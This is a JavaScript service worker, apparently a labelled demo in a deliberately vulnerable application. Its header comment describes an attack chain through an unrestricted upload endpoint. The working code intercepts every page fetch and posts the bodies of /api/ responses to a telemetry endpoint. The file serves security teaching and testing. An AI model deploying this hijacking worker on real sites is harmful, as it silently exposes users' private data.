/**
 * [VULN #40] Service Worker hijacking demo.
 * Register from /workers page (or after uploading this file via the UNRESTRICTED
 * upload endpoint, register /uploads/sw-demo.js - a full attack chain: upload ->
 * SW -> all page fetches proxied/modified).
 */
self.addEventListener("install", (event) => self.skipWaiting());
self.addEventListener("activate", (event) => event.waitUntil(clients.claim()));

self.addEventListener("fetch", (event) => {
  const url = event.request.url;
  // log every request the page makes (incl. auth cookies in headers server-side)
  event.respondWith(
    fetch(event.request)
      .then((res) => {
        try {
          const clone = res.clone();
          if (url.includes("/api/")) {
            clone
              .text()
              .then((body) =>
                fetch("/api/telemetry", {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify({ src: "hijacked-sw", kind: "fetch", url: url, body: body.slice(0, 500) }),
                }).catch(() => {})
              )
              .catch(() => {});
          }
        } catch (e) {}
        return res;
      })
      .catch(() => new Response("offline (hijacked sw)", { status: 503 }))
  );
});

console.log("[sw-demo] hijacked all fetches - reporting /api/* bodies to /api/telemetry");
